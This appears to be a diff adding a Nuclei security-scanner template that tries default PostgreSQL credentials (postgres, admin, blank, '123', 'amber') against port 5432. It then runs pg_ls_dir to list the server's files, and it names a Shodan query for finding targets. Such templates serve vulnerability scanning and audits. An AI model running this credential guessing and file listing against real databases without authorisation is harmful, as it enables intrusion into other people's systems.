@@ -1,0 +1,48 @@
+id: postgresql-file-read
+
+info:
+  name: PostgreSQL File Read
+  author: pussycat0x
+  severity: high
+  description: |
+    Read and list the files within the PostgreSQL database,
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-read
+  metadata:
+    shodan-query: product:"PostgreSQL"
+    verified: true
+  tags: js,network,postgresql,authenticated
+
+javascript:
+  - code: |
+      const postgres = require('nuclei/postgres');
+      const client = new postgres.PGClient;
+      connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, "select pg_ls_dir('./');");
+      Export(connected);
+
+    args:
+      Host: "{{Host}}"
+      Port: 5432
+      User: "{{usernames}}"
+      Pass: "{{password}}"
+      Db: "{{database}}"
+
+    payloads:
+      usernames:
+        - postgres
+        - admin
+      password:
+        - postgres
+        -
+        - 123
+        - amber
+      database:
+        - postgres
+
+    attack: clusterbomb
+
+    extractors:
+      - type: json
+        json:
+          - '.Rows[].pg_ls_dir'
+# digest: 4a0a00473045022100b6a67073677ce62de92d8f1b512df26d6a72070825e67013aa2c8b33dc552c70022079606bcf388173437f77e0005077a2da82a4b6b2eb52667cb4e9619f27ad261e:922c64590222798bb761d5b6d8e72950
